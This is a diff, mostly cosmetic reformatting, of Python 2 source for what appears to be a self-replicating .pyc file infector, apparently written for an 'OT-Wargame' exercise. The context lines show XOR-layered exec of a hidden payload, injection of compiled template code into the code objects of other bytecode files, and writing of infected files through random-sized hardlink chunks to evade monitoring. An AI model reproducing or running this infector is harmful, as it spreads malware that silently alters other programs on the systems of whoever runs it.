@@ -15,12 +15,12 @@ DECRYPT = None
 exec "__XOR_LAYER_PY__"
 crypt = a
 
+
 def to_hex(s):
     return "\\x" + "\\x".join(c.encode("hex") for c in s)
-    
-    
-def hardlink_write(content, file):
 
+
+def hardlink_write(content, file):
     size = len(content)
     offset = 0
     hardlink = "/tmp/%s" % uuid()
@@ -28,15 +28,16 @@ def hardlink_write(content, file):
     f = open(hardlink, 'w')
     f.close()
     os.unlink(hardlink)
-    while(offset < size):
+    while offset < size:
         os.link(file, hardlink)
         f = open(hardlink, 'a')
-        size_chunk = randint(1, 1+(size-offset)/2)
-        f.write(content[offset:offset+size_chunk])
+        size_chunk = randint(1, 1 + (size - offset) / 2)
+        f.write(content[offset:offset + size_chunk])
         f.flush()
         offset += size_chunk
         f.close()
-        os.unlink(hardlink)    
+        os.unlink(hardlink)
+
 
 if __file__.endswith('.pyc'):
     template = "__TEMPLATE_PY__"
@@ -85,7 +86,7 @@ if __file__.endswith('.pyc'):
         payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
         payload = payload[:-2]
         data.code[:0] = payload
-        content = "".join([head,marshal.dumps(data.to_code())])
+        content = "".join([head, marshal.dumps(data.to_code())])
         hardlink_write(content, f_to_infect)
 
     if socket.gethostname() == "OT-Wargame":
